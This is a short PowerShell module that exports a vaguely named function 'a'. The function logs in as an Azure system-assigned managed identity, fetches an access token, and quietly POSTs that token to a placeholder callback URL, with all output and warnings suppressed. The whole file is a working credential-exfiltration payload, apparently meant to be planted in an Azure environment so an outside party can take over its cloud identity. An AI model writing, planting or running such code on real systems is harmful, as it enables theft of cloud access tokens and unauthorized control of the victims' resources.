function a {
param(
    [string] $callbackURL = "http://YOUR_URL_HERE/"
    )

# Hide the warning output
$SuppressAzurePowerShellBreakingChangeWarnings = $true

# Connect as the System-Assigned Managed Identity
Connect-AzAccount -Identity | Out-Null

# Get a token
$token = Get-AzAccessToken | ConvertTo-Json

# Send the token to the callback URL
Invoke-RestMethod -Uri $callbackURL -Method Post -Body $token | Out-Null

}


Export-ModuleMember -Function a